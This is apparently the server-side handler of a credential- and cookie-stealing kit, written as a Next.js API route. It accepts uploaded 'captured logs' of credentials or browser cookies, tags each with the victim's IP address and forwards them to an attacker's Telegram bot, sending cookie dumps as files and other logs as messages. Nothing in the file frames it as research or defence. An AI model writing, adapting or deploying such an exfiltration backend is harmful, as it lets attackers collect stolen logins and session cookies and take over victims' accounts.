import nextConnect from 'next-connect';
import multer from 'multer';
import sendFileToTelegram from '../utils/sendFileToTelegram.js'; // Adjust path if needed

export const config = { api: { bodyParser: false } };
const upload = multer();
const handler = nextConnect();

handler.use(upload.single('file'));

handler.post(async (req, res) => {
  const telegramToken = process.env.TELEGRAM_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!telegramToken || !chatId) {
    return res.status(500).json({ success: false, message: 'Bot not configured' });
  }
  const botUrl = `https://api.telegram.org/bot${telegramToken}`;

  // File upload handling (if any)
  if (req.file) {
    // Optionally: implement file->telegram document if needed
    return res.status(200).json({ success: true });
  }

  // JSON logs (credentials or cookies)
  if (req.headers['content-type']?.includes('application/json')) {
    let body = '';
    await new Promise((resolve, reject) => {
      req.on('data', chunk => body += chunk);
      req.on('end', resolve);
      req.on('error', reject);
    });
    let json;
    try {
      json = JSON.parse(body);
    } catch {
      return res.status(400).json({ success: false, message: 'Invalid JSON' });
    }
    const { ip, type } = json;

    if (type === 'cookie-file') {
      // Send cookie JSON as a file via helper
      const filename = `${ip || 'unknown'}-cookie-file.json`;
      const caption = ip ? `IP: ${ip}\nType: cookie-file\n` : '';
      const tgRes = await sendFileToTelegram({
        botUrl,
        chatId,
        json,
        filename,
        caption
      });
      const tgText = await tgRes.text();
      if (!tgRes.ok) {
        console.error('Telegram API error (cookie json as file):', tgText);
        return res.status(502).json({ success: false, error: tgText });
      }
      return res.status(200).json({ success: true });
    } else {
      // Send as text log
      let text = `📥 Captured log\n`;
      if (ip) text += `IP: ${ip}\n`;
      if (type) text += `Type: ${type}\n`;
      text += `\n${JSON.stringify(json, null, 2)}`;
      const tgRes = await fetch(`${botUrl}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text })
      });
      const tgText = await tgRes.text();
      if (!tgRes.ok) {
        console.error('Telegram API error (json text):', tgText);
        return res.status(502).json({ success: false, error: tgText });
      }
      return res.status(200).json({ success: true });
    }
  }

  return res.status(400).json({ success: false, message: 'Bad payload' });
});

export default handler;
